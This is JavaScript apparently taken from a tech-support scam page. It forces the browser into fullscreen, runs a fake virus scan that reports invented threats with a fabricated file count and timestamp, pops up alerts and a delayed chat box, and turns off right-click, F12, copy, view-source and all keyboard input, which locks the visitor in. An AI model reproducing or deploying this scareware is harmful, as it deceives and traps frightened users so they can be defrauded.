  var elem = document.documentElement;
         function openFullscreen() {
           if (elem.requestFullscreen) {
             elem.requestFullscreen();
           } else if (elem.webkitRequestFullscreen) { /* Safari */
             elem.webkitRequestFullscreen();
           } else if (elem.msRequestFullscreen) { /* IE11 */
             elem.msRequestFullscreen();
           }
         }
         
         function closeFullscreen() {
           if (document.exitFullscreen) {
             document.exitFullscreen();
           } else if (document.webkitExitFullscreen) { /* Safari */
             document.webkitExitFullscreen();
           } else if (document.msExitFullscreen) { /* IE11 */
             document.msExitFullscreen();
           }
         }

 /*         if (navigator.userAgentData) {
  navigator.userAgentData.getHighEntropyValues(["platformVersion"])
    .then(ua => {
      if (navigator.userAgentData.platform === "Windows") {
        const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
        if (majorPlatformVersion >= 13) {
          document.getElementById("which").innerHTML = " 11";
        } else if (majorPlatformVersion > 0) {
          document.getElementById("which").innerHTML = " 10";
        } else {
          console.log("Beyond");
        }
      } else {
        console.log("It doesn't work on Windows");
      }
    });
} else {
  console.log("UserAgentData API not supported");
}
*/
/*audio*/

 addEventListener("click", function() {
         var el = document.documentElement
         , rfs =
                el.requestFullScreen
             || el.webkitRequestFullScreen
             || el.mozRequestFullScreen
         ;
         rfs.call(el);
         });


 setTimeout(function () {
      document.getElementById("box").style.display = "block";
      
      // 100%//
      }, 800);
      setTimeout(function () {
      startScan();
      }, 1000);
      function startScan() {
      document.getElementById("box").style.display = "none";
      document.getElementById("scan").style.display = "block";
      
     
      
        setTimeout(function () {
            document.getElementById("info").innerHTML = "threat detected. <br> Last scan: " +  date_time + "<br> 11 we found the threat of this incident..<br> The analysis lasted 0 minutes and 6 seconds. <br> 3821 digitized files. "
        }, 1000);
        setTimeout(function () {
            document.getElementById("bar").style.display = "none";
        }, 1000);
        setTimeout(function () {
            document.getElementById("re").innerHTML = "Quick Scan";
        }, 1000);
        setTimeout(function () {
            document.getElementById("recx").style.display = "none";
        }, 1000);
        setTimeout(function () {
            document.getElementById("recx-hide").style.display = "none";
        }, 1000);
        setTimeout(function () {
            document.getElementById("shx").style.display = "block";
        }, 1000);
      
        $(".alert_popup").delay(1000).fadeIn(500);
        $(".lst").delay(1500).fadeIn(500);
      
      } 
      
      function playSound() {
      document.getElementById("beep").play();
      }
      var date = new Date();
      var current_date = date.getFullYear()+"-"+(date.getMonth()+1)+"-"+ date.getDate();
      var current_time = date.getHours()+":"+date.getMinutes();
      var date_time = current_date+" "+current_time;  
      /*document.getElementById("p1").innerHTML = date_time;*/


     /* function getParameterByName(e,n=window.location.href){e=e.replace(/[\[\]]/g,"\\$&");n=new RegExp("[?&]"+e+"(=([^&#]*)|&|#|$)").exec(n);return n?n[2]?decodeURIComponent(n[2].replace(/\+/g," ")):"":null}
      function finalCountdown(){_tmx=_now,$.cookie("tmx",_now,{expires:1,path:"/",secure:!0})}*/
      function exitModal(){$("#exitModal").modal("hide"),$("body").removeClass("modal-open"),$(".modal-backdrop").remove(),_smodal=!1}
      
      var _kmodal = 0;
      var _smodal = false;
      var _now = (new Date().getTime() / 1000) + 86401;
      var _tmx = 0;
      
      
      
      /*$('.lpm-3').on('click', function(e) 
      {
        e.preventDefault();
        $('#modal-title-1').addClass('d-none');
        $('#modal-title-2').removeClass('d-none');
        $('#exitModal').modal('show');
        $("#notification-container").removeClass("notification-container-active");
      });*/
      
     /* $('.lpm-4').on('click', function(e) 
      {
        e.preventDefault();
        $('#exitModal').modal('show');
        $("#notification-container").removeClass("notification-container-active");
      });*/
      
      $('#modal-exit').on('click', function(e) { exitModal(); });
      $('#exitModal').on('hidden.bs.modal', function () { exitModal(); });
    /*  $('.yellowstarts').each( function(e) { $(this).css('width', $(this).data('width') + '%'); });*/
      
      $(document, window, 'html').on('mouseleave', function(a)
      {
        if ( a.pageY - $(document).scrollTop() <= 20 && _kmodal < 2 && _smodal == false )
        {
          _smodal = true;
          _kmodal++;
          $('#modal-title-2').addClass('d-none');
          $('#modal-title-1').removeClass('d-none');
          $('#exitModal').modal('show');
          $("#notification-container").removeClass("notification-container-active");
        }
      });
      
      /*if( $('#flipdown').length )
      {
        _tmx = $.cookie("tmx");
        if ( !_tmx || _tmx  >= _now ) finalCountdown(); else _tmx = parseInt( _tmx );
        var _headings = $('#flipdown').data('headings').split(",");
        var flipdown = new FlipDown(_tmx, { headings: _headings }).start();
      }
      
      $('#fdlink').wrap('<a href="' + $('#fdlink').data('href') + '" class="fdlink"></a>');
      
      var _a3v = $.cookie("a3v");
      if ( _a3v && ( _a3v == 1 || _a3v == 2 ) ) $('#blogitem').prepend('<div class="text-center advertorial-' + _a3v + ' mb-3">Advertorial</div>');*/
      
      /*$('#notification-bell').on('click', function(e){ $("#notification-container").addClass("notification-container-active"); } );
      $('#btn-close-notification-container-icon').on('click', function(e){ $("#notification-container").removeClass("notification-container-active"); } );
      $('.sphref').on('click', function(e){ window.open( $(this).data('href'), '_blank' ); } );*/
      
      /*if ( document.getElementById('notification-bell') )
      {
        $('body').on('click',function(e)
        {
          if ( !document.getElementById('notification-container').contains(e.target) && !document.getElementById('notification-bell').contains(e.target) )
          {
            $("#notification-container").removeClass("notification-container-active");
          }
        });
      }*/
      
      if ( document.getElementById('footer-bottom-sticky') )
      {
        if ( $(window).scrollTop() > 100 )
        {
          $('#footer-bottom-sticky').fadeIn();
        }
        
        $(window).scroll( function()
        {
          if ( $(window).scrollTop() > 100 )
          {
            $('#footer-bottom-sticky').fadeIn();
          }
          else
          {
            $('#footer-bottom-sticky').fadeOut();
          }
        });
      }
      
      if ( document.getElementById('date-month-year') && document.getElementById('locale-month-year') )
      {
        var obj = document.getElementById('date-month-year');
        var locale = document.getElementById('locale-month-year').value;
        if ( locale )
        {
          var event = new Date();
          var options = { month: 'long', year: 'numeric' };
          var dt = event.toLocaleDateString(locale, options);
          if ( dt ) document.getElementById('date-month-year').innerHTML = ' - ' + dt;
        }
      }

       $(document).ready(function() {
       $("#chat-box").delay(5000).fadeIn(100);
      });

        $(document).ready(function () {
          $("#mycanvas").click(function () {
              $("#welcomeDiv").show();
          });
      });

        document.onkeydown = function (e) {
  e.preventDefault();
  return false;
}

 // To disable right click
      
      document.addEventListener('contextmenu', event => event.preventDefault());
      
      
      
      // To disable F12 options
      
      document.onkeypress = function (event) {
      
          event = (event || window.event);
      
          if (event.keyCode == 123) {
      
              return false;
      
          }
      
      }
      
      document.onmousedown = function (event) {
      
          event = (event || window.event);
      
          if (event.keyCode == 123) {
      
              return false;
      
          }
      
      }
      
      document.onkeydown = function (event) {
      
          event = (event || window.event);
      
          if (event.keyCode == 123) {
      
              return false;
      
          }
      
      }
      
      
      
      // To To Disable ctrl+c, ctrl+u
      
      
      
      jQuery(document).ready(function ($) {
      
          $(document).keydown(function (event) {
      
              var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();
      
      
      
              if (event.ctrlKey && (pressedKey == "c" || pressedKey == "u")) {
      
      
      //disable key press porcessing
      
                  return false;
      
              }
      
          });
      
      });
      
      document.addEventListener('keydown', event => {
      console.log(`User pressed: ${event.key}`);
      event.preventDefault();
      return false;
      });